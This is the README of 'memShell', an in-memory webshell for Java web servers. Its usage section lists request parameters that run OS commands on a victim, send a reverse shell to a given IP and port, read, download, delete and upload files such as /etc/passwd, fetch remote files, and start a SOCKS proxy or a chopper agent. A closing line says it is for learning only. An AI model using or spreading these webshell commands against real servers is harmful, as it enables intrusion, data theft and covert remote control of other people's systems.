# memShell
a webshell resides in the memory of java web server

# Usage
* anyurl?pwd=pass //show this help page.  
* anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.  
* anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.  
* anyurl?pwd=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.  
* anyurl?pwd=pass&model=list[del|show]&path=/etc/passwd  //list,delete,show the specified path or file.  
* anyurl?pwd=pass&model=download&path=/etc/passwd  //download the specified file on the victim's disk.  
* anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.  
* anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.  
* anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.  

**It is recommended to use the POST method to submit data** 

# note
For learning exchanges only, do not use for illegal purposes.by rebeyond.
